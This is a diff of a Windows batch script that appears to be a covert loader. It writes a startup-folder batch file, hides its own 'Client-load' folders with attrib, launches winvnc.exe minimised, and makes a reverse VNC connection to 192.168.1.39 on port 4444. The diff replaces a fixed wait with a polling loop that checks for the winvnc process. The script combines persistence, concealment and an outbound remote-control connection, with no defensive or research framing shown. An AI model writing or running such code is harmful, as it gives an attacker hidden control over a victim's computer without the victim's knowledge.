@@ -14,13 +14,6 @@ REM Create the batch file for startup folder (startup_winvnc.bat)
 REM Create the batch file to run winvnc.exe (run_winvnc.bat)
 (
   echo @echo off
-  echo tasklist /fi "imagename eq winvnc.exe" 2>nul | find /i "winvnc.exe" >nul
-  echo if errorlevel 1 (
-  echo     echo No existing winvnc.exe process found.
-  echo ) else (
-  echo     taskkill /im winvnc.exe /f
-  echo     timeout /t 1 >nul
-  echo )
   echo start winvnc.exe -run
   echo timeout /t 1 >nul
   echo winvnc.exe -connect 192.168.1.39::4444
@@ -43,14 +36,19 @@ REM Hide the extracted Client-load folder and its parent folder
 attrib +h "%script_dir%\.."
 attrib +h "%script_dir%\..\.."
 
-REM Start winvnc.exe to trigger permissions prompt
-start "" winvnc.exe
+REM Start winvnc.exe and wait for permissions
+start /min "" winvnc.exe -run
 
-REM Wait for 7 seconds to allow the user to grant permissions
-timeout /t 7 >nul
-
-REM Run the run_winvnc.bat script
-timeout /t 1 >nul
-call "%script_dir%run_winvnc.bat"
+REM Wait for winvnc.exe to have permissions (check every 2 seconds)
+:CheckPermissions
+echo Checking permissions for winvnc.exe...
+timeout /t 2 >nul
+tasklist /fi "imagename eq winvnc.exe" 2>nul | find /i "winvnc.exe" >nul
+if errorlevel 1 (
+  goto CheckPermissions
+) else (
+  echo winvnc.exe has permissions. Starting run_winvnc.bat...
+  call "%script_dir%run_winvnc.bat"
+)
 
 REM End of main.bat
